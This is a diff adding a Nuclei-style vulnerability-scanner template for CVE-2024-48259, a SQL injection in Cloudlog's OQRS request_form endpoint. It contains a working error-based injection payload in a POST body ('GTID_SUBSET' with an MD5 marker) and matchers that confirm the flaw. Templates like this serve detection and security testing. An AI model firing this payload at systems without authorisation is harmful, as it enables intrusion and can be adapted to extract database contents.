@@ -1,0 +1,27 @@
+id: cloudlog-oqrs-sqli-cve-2024-48259
+info:
+  name: Cloudlog OQRS request_form SQL Injection (CVE-2024-48259)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-48259
+variables:
+  random_value: "{{rand_int(1000,10000)}}"
+  hashed_value: "{{md5(random_value)}}"
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/index.php/oqrs/request_form"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      station_id=1 and GTID_SUBSET(CONCAT((SELECT(md5({{random_value}})))),3119)
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "{{hashed_value}}"
+          - "Database Error"
